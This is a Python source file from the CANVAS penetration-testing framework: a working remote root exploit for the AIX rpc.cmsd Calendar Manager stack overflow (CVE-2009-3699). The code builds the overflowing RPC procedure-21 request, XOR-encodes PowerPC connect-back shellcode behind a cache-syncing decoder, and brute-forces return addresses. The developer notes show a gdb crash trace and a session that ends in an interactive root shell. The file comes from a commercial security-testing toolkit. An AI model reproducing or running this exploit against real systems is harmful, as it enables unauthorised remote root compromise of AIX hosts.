##ImmunityHeader v1 
###############################################################################
## File       :  aixcmsd.py
## Description:  
##            :  
## Created_On :  Tue Oct 27 10:58:26 2009
## Created_By :  Bas Alberts
## Modified_On:  
## Modified_On:  Tue Oct 27 12:12:45 2009
## Modified_By:  Bas Alberts
## (c) Copyright 2009, Immunity Inc all rights reserved.
###############################################################################
#!/usr/bin/env python

# AIX cmsd exploit 
# (c) Immunity, Inc. 2009
# Use under the CANVAS license only

#TODO: Test with bouncing
#      add test() function 
#      Move shellcode into shellcodes/ directory
#      Add covertness features

import sys
if '.' not in sys.path:
    sys.path.append('.')

import traceback
import random

import libs.rpc as rpc
from tcpexploit import tcpexploit
from exploitutils import *
from MOSDEF import mosdef
from MOSDEF import GetMOSDEFlibc

from aixNode import aixNode
from MOSDEFShellServer.AIX import AIX_PowerPC
from shellcode.aixShellcodeGenerator import aix_powerpc
from shellcode.aixShellcodeGenerator import get_aix_version
import canvasengine
from CLI.xmlrpc import StartServerThread

NAME                                = 'rpc.cmsd remote root exploit (AIX)'
DESCRIPTION                         = "Calendar Manager stack overflow for AIX"
VERSION                             = 'v0.1'

DOCUMENTATION                       = {}
DOCUMENTATION['Date Public']        = '10/07/2009'
DOCUMENTATION['References']         = ['http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=825', 'http://archives.neohapsis.com/archives/fulldisclosure/current/0112.html']
DOCUMENTATION['Repeatability']      = 'Unlimited'
DOCUMENTATION['Versions Affected']  = 'AIX 5.x / AIX 6.x'
DOCUMENTATION["OSVBD"]              = '58726'
DOCUMENTATION["CVE Name"]           = "CVE-2009-3699"
DOCUMENTATION['Notes']              = ''

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Remote'
PROPERTY['ARCH']                    = [['AIX', 'powerpc']]
PROPERTY['VERSION']                 = ['5.1', '5.2', '5.3', '6.1']

DEVNOTES = """
NOTE: this is the EXACT SAME vulnerability as was fixed in 2002 in SCO:

http://archives.neohapsis.com/archives/linux/caldera/2002-q1/0020.html

Excerpt:

'The exploit code provided by jGgM requests program 100068
version 4 on UDP (implemented by /usr/dt/bin/rpc.cmsd) and
then does a single RPC call to procedure 21 (rtable_create)
passing 2 strings, one of which creates a buffer overflow.

$BASE/server/rtable4.c:_DtCm_rtable_create_4_svc(args) where
args is of type Table_Op_Args_4: 2 client supplied strings as
args->target and args->new_target. "new_target" is never used
and "target" creates the overflow later on.'

...

(aix 5.2) # ls -alrt /var/spool/calendar/core
-rw-rw-r--   1 root     system      1791415 Oct 07 13:31 /var/spool/calendar/core
(aix 5.2) # find / -name 'rpc.cmsd'
/usr/dt/bin/rpc.cmsd
(aix 5.2) # gdb /usr/dt/bin/rpc.cmsd /var/spool/calendar/core
GNU gdb 6.8
Copyright (C) 2008 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "powerpc-ibm-aix5.1.0.0"...
(no debugging symbols found)
Core was generated by `rpc.cmsd'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414140 in ?? ()
(gdb) 

...
Cache sync fixed with self modifying loop:

Core was generated by `rpc.cmsd'.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0x2002a44c in ?? ()
(gdb) 

commandline example:

CANVAS$ python ./exploits/aixcmsd/aixcmsd.py -t192.168.1.101
...
[ Fri Oct  9 14:27:48 2009 ][C] (192.168.1.101/32) [+] Attempting to trigger (0x2002A404)...
[ Fri Oct  9 14:27:48 2009 ]Connected to by ('192.168.1.101', 32776)
[ Fri Oct  9 14:27:48 2009 ]Informing client that we got a connection
[ Fri Oct  9 14:27:48 2009 ][C] (192.168.1.101/32) [+] Listener informClient() callback called!
...
[ Fri Oct  9 14:27:51 2009 ][C] (192.168.1.101/32) [+] Hooray! got it .. python cmdline.py to get to your shell!
...
^ NOTE: leave this running until you're done with your shell ...

work@work-desktop:/media/disk/svn/CANVAS$ python cmdline.py 
[C] Getting interface data
[C] Discovered Interfaces: [['lo', '127.0.0.1', 4278190080L], ['eth0', '192.168.1.100', 4294967040L], ['vmnet1', '192.168.123.1', 4294967040L], ['vmnet8', '192.168.156.1', 4294967040L], ['lo', '::1', '0xffffffffffffffffffffffffffffffff'], ['eth0', 'fe80::21a:a0ff:feaf:a073', '0xffffffffffffffff'], ['vmnet1', 'fe80::250:56ff:fec0:1', '0xffffffffffffffff'], ['vmnet8', 'fe80::250:56ff:fec0:8', '0xffffffffffffffff']]
Setting CANVAS session to: default
Using 'Reports/default' as base data output directory
 _____ _____ _____ _____ _____ _____ 
|     |  _  |   | |  |  |  _  |   __|
|   --|     | | | |  |  |     |__   |
|_____|__|__|_|___|\___/|__|__|_____|
         *** XMLRPC cmdline v0.1 *** 

<<<CANVAS>>> nodes
[+] Listing all active nodes
ID: 0 - aixNode:0->0
[+] Listed all active nodes
<<<CANVAS>>> interact 0
[+] Got an active session for node 0 (Console Mode)
[+] Note: will revert back to <<<CANVAS>>> on "detach"
AIX/MOSDEF$ shellshock
[!] Turning MOSDEF-Node into temporary interactive shell
[!] Note: will revert back to MOSDEF on "exit"
shellshocked!
# exit
[!] Cleaning up left over muckery, please remain seated..
[!] Your regular MOSDEF programming will return shortly..
AIX/MOSDEF$ detach
[+] Detaching from session
[+] Detached
<<<CANVAS>>> suicide
[+] Server Thread Suicided
<<<CANVAS>>> 

"""

class GOOOShell(Exception):    
    __name__ = 'GOOOShell'
    def __repr__(self):
        return 'GOOO'

# trigger UDP client for call 21
class UDPRPC(rpc.UDPClient):
    
    def mkcred(self):
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(random.randint(1, 99999),\
                                                     "localhost", 0, 0, [])
        return self.cred
    
    def call_21(self, args, debug = False):
        if debug == True:
            print "### halted, attach"
            sys.stdin.read(1)
        return self.make_call(21, 
                              args,
                              self.packer.pack_strings,
                              self.unpacker.unpack_int)
    
    # so we can control resends via count ...
    def do_call(self):
        call = self.packer.get_buf()
        self.sock.send(call)
        try:
                from select import select
        except ImportError:
                print 'WARNING: select not found, RPC may hang'
                select = None
        BUFSIZE = 8192 # Max UDP buffer size
        timeout = 1
        # modified from lib for exploit ... we only want to send 1 packet ...
        count = 1
        while 1:
            r, w, x = [self.sock], [], []
            if select:
                r, w, x = select(r, w, x, timeout)
            if self.sock not in r:
                count = count - 1
                if count < 0: raise RuntimeError, 'timeout'
                if timeout < 25: timeout = timeout *2
                self.sock.send(call)
                continue
            reply = self.sock.recv(BUFSIZE)
            u = self.unpacker
            u.reset(reply)
            xid, verf = u.unpack_replyheader()
            if xid <> self.lastxid:
                    continue
            break

# trigger TCP client for call 21
class TCPRPC(rpc.TCPClient):
    
    def mkcred(self):
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(random.randint(1, 99999),\
                                                     "localhost", 0, 0, [])
        return self.cred
    
    def call_21(self, args, debug = False, pollwait = 3):
        if debug == True:
            print "### halted, attach"
            sys.stdin.read(1)
        return self.make_call(21, 
                              args,
                              self.packer.pack_strings,
                              self.unpacker.unpack_int,
                              pollwait = pollwait)
    
    # customized make_call to work with interval
    def make_call(self, proc, args, pack_func, unpack_func, pollwait = 3):
        if pack_func is None and args is not None:
            raise TypeError, 'non-null args with null pack_func'
        self.start_call(proc)
        if pack_func:
            pack_func(args)
        self.do_call(pollwait = pollwait)
        if unpack_func:
            result = unpack_func()
        else:
            result = None
        self.unpacker.done()
        return result
    
    # customized do_call to work with GOOOFindSock
    def do_call(self, pollwait = 3):
        if self.sock == None:
            return
        call = self.packer.get_buf()
        if self.covertness >= 9:
            print "Covert do_call"
            import time
            i = 0
            for c in call:
                rpc.sendfrag(self.sock, 0, c)
                time.sleep(1.5)
                i += 1
            rpc.sendfrag(self.sock, 1, "")
        else:
            rpc.sendrecord(self.sock, call)
        # wait for payload poll to be there on slow boxes
        if pollwait:
            print "[+] waiting %d secs for payload poll (real world)" % pollwait
            import time
            time.sleep(pollwait)
        self.sock.send('GOOO')
        reply = self.sock.recv(4)
        if 'GOOO' in reply:
            raise GOOOShell
        return
    
class theexploit(tcpexploit):
    
    CMSD_PROG = 100068
    CMSD_VERS = 4
    
    def __init__(self):
        tcpexploit.__init__(self)
        self.host       = '127.0.0.1'
        self.port       = 0
        self.auto       = True
        self.tcp        = False
        self.win        = False
        self.version    = 0
        self.targets    = {
            0 : 'AutoVersioning',
            1 : '5.1',
            2 : '5.2'
        }
        
        #default version
        self.aix_ver    = '5.1'
        
        #a dictionary with our targets in it mapped to shellcode versions.
        self.types      = { 
            '5.2' : canvasengine.AIXMOSDEF_52_PPC,
            '5.1' : canvasengine.AIXMOSDEF_51_PPC 
        }
        return
    
    def displayVersions(self):
        for v in self.targets:
            print '%d : %s' % (v, self.targets[v])
        return
    
    # due to icache/dcache sync semantics, we want a custom version of our XOR encoder ...
    def xor_encode(self, payload, version = '5.1', xormask = 0xfe, debug = False):
        """ return an XOR encoded payload """
    
        aix_libc = GetMOSDEFlibc('AIX', 'powerpc', version)
        encoded = []
        for c in payload:
            encoded.append( "%c" % (ord(c) ^ xormask))
            if ord(c) ^ xormask in [0x00]: # badchars
                print "POSSIBLE BAD CHAR in %X ^ %X" % (ord(c), xormask) 
        encoded = ''.join(encoded)

        safe_size = 1
        while (not ((safe_size + len(encoded)) & 0xff00) or \
               not ((safe_size + len(encoded)) & 0x00ff)):
            safe_size += 1

        # safe mask that doesn't cause nul bytes
        print "Found safe size of %x" % safe_size

        decoder = """ 
        .start:
            xor. r2,r2,r2
            subic. r2,r2,1
            cmpwi r2,-1
            bgtl .start             ! preventing common bad char @
            mflr r15
            addi r15,r15, 0x0149
            addi r15,r15,-0x0101
            xor r16,r16,r16
            addi r16,r16, 0x%x      ! size + 0x0101
            addi r16,r16,-0x%x
        .xorloop:
            lbzx r17,r16,r15
            xori r18,r17,0xfe%.2x   ! XOR
            stbx r18,r16,r15
            subic. r16,r16,1        ! yesh i know .. off by one
            cmpwi r16,-1
            bgtl .xorloop           ! preventing common bad char @
        .sync:
            
            ! self modifying loop to sync caches ....
            xor. r2,r2,r2            
            lis r3,0x7c42           
            ori r3,r3,0x1279        ! r3 == xor. r2,r2,r2
            stw r3,-4(r15)
            cmpwi r2,-1             ! preventing @ on branch
            bgtl .sync              ! gets nopped out by stw of r3
                    
        .payload:
        """ % ( len(encoded) + safe_size, 
                safe_size, 
                xormask
            ) 

        decoder = mosdef.assemble(decoder, 'PPC') + encoded

        # dump it for debugging ...
        if debug == True:
            import struct
            i = 0
            print "### pre encoding ###"
            while i < len(payload):
                print "%.8X" % struct.unpack('>L', payload[i:i+4])[0]
                i += 4
            i = 0
            print "### post encoding ###"
            while i < len(decoder):
                print "%.8X" % struct.unpack('>L', decoder[i:i+4])[0]
                i += 4

        return decoder
    
    def get_args(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        return
    
    def inform_client(self):
        self.log("[+] Listener informClient() callback called!")
        self.win = True
        return
    
    def test(self):
        """ this is called before neededListenerTypes from engine """
        self.get_args()
        app = self.engine.getModuleExploit("osdetect")
        app.link(self)
        app.run()
        kprim=self.target.get_knowledge("OS") #a hostKnowledge object or None
        if not kprim:
            self.log("Could not determine which version of OS the target was!")
            return False 
        
        else:
            myos=kprim.known #get the CANVAS OS object
            if myos.base!="AIX":
                self.log("AIX not the detected OS")
                return False #testing
            #else, we are AIX!
            
        
            self.aix_ver = myos.version #5.1/5.2 as a string
            if self.aix_ver in self.types.keys():
                return True
        return False
    
    def neededListenerTypes(self):
        """ this determines listener type for engine """
        if self.test() == True:
            self.log('[+] Versioned AIX as: %s' % self.aix_ver)
            return self.types[self.aix_ver]
        self.log('[-] Could not version AIX ...')
        return []
        
    def init_listener(self, version = '5.2'):
        """ only used for magic commandline operation """
        if version not in self.types.keys():
            self.log("[+] AIX version not supported!")
            return None
        listener = self.engine.autoListener(self, self.types[version],
                                            host = self.target.interface,
                                            autoFind = True)
        # little voodoo haq, deep CANVAS son ...
        listener.informClient = self.inform_client
        return listener
        
    def get_payload(self, version = '5.2'):
        self.log('[+] Using AIX payload version: %s' % version)
        if not self.callback and self.engine:
            self.callback = self.init_listener(version = version)
        if not self.callback:
            self.log('[+] No callback set ...')
            return ''
        sc = aix_powerpc(version = version)
        sc.addAttr('tcp_connect', { 'ip' : self.callback.ip, 
                                    'port' : self.callback.port})
        sc.addAttr('read_and_exec_loop_no_errno', { 'fd' : 'r30' })
        data    = sc.get()
        xormask = 0x00
        while xormask <= 0xff:
            encoded = self.xor_encode(data, xormask = xormask, version = version)
            if '\x00' not in encoded and '@' not in encoded: 
                break
            xormask += 1
        if xormask > 0xff:
            self.log('[+] Could not auto-encode payload ...')
            return ''
        else:
            self.log('[+] found valid xormask: %x' % xormask)
            self.log('[+] encoded payload length: %d bytes' % len(encoded))
        return encoded
        
    def udp_port_map(self, prog = CMSD_PROG, vers = CMSD_VERS):
        port = 0
        try:
            # mapping: program number, version, protocol, port
            pmap = rpc.UDPPortMapperClient(self.host)
            port = pmap.Getport((prog, vers, rpc.IPPROTO_UDP, 0))
        except:
            self.log('[-] could not connect to port mapper.')
        return port
    
    def tcp_port_map(self, prog = CMSD_PROG, vers = CMSD_VERS):
        port = 0
        try:
            # mapping: program number, version, protocol, port
            pmap = rpc.TCPPortMapperClient(self.host, getsock = self)
            port = pmap.Getport((prog, vers, rpc.IPPROTO_TCP, 0))
        except:
            self.log('[-] could not connect to port mapper.')
        return port
    
    def run(self, prog = CMSD_PROG, vers = CMSD_VERS):

        self.get_args()
        
        # version the host so we can get right syscall set
        self.log('[+] Versioning host over dtspcd')
        if self.version:
            try:
                self.aix_ver = self.targets[self.version]
            except:
                self.log('[+] No such version ...')
                return None
        else:
            if self.test() == False:
                return None
        payload = self.get_payload(version = self.aix_ver)
        if not payload:
            return None
        
        # query port mapper if not hardset
        if not self.port:
            self.log('[+] connecting to port mapper')
            if self.tcp == False:
                self.port = self.udp_port_map()
            else:
                self.port = self.tcp_port_map()
                
        # some sanity checking
        if self.port:
            self.log('[+] rpc.cmsd at port %d' % self.port)
        else:
            self.log('[-] could not find rpc.cmsd port')
            return None
            
        nop = mosdef.assemble('xor. r2,r2,r2', 'PPC')
                    
        if self.aix_ver in ['5.2']:
            ret_b = 0x20029004 # brute base 5.2
            brt_s = 0x200
            a_aln = 0
            pol_w = 0
            bufsz = 4096
            
        if self.aix_ver in ['5.1']:
            ret_b = 0x20029004 # brute base 5.1
            brt_s = 0x200
            a_aln = 0
            pol_w = 3
            bufsz = 4096
        
        for ret_a in range(ret_b, ret_b + 0x7ffff, brt_s):
        #for ret_a in [0x2002a3f4]:
            try:
                
                if self.tcp == False:
                    rpcclient = UDPRPC(self.host, prog, vers, self.port)
                else:
                    rpcclient = TCPRPC(self.host, prog, vers, self.port, getsock = self)
                
                self.log('[+] Attempting to trigger (0x%.8X)...' % ret_a)
                
                data = 'P' * a_aln
                if len(payload) > (bufsz-brt_s*2) or len(payload) % 4:
                    self.log('[-] Payload is too big or not aligned on 4 ...')
                    return False        
                while bufsz-len(data)-len(payload):
                    data += nop
                data += payload
                # saved registers
                data    += struct.pack('>L', 0x41414141)
                data    += struct.pack('>L', 0x42424242)
                # saved link register
                data    += struct.pack('>L', ret_a)
                data    += struct.pack('>L', 0x44444444)
                data    += struct.pack('>L', 0x45454545)
                data    += struct.pack('>L', 0x46464646)
                
                try:
                    if self.tcp == False:
                        rpcclient.call_21([data, ''], debug = False)
                    else:                    
                        rpcclient.call_21([data, ''], pollwait = pol_w, debug = True)
                except:
                    self.log('[+] timeout ...')
                    
                if self.win == True or self.ISucceeded() == True:
                    self.log('[+] Hooray! got it .. python cmdline.py to get to your shell!')
                    return True
                
            except:
                self.log('[+] crash')
                if rpcclient.sock:
                    rpcclient.close()
                
        self.log('[+] no go.')    
        return False
    
if __name__ == '__main__':
    app         = theexploit()
    if len(sys.argv) > 1:
        magic = True
        testing = False 
        for opt in sys.argv:
            # if callback set, don't do auto callback
            if '-l' in opt:
                magic = False
            if '-T' in opt:
                testing=True 
        if magic == True:
            app.engine = StartServerThread().server_thread    
    ret = standard_callback_commandline(app)
    if not ret or testing:
        sys.exit(1) #otherwise the app.engine will stick around forever
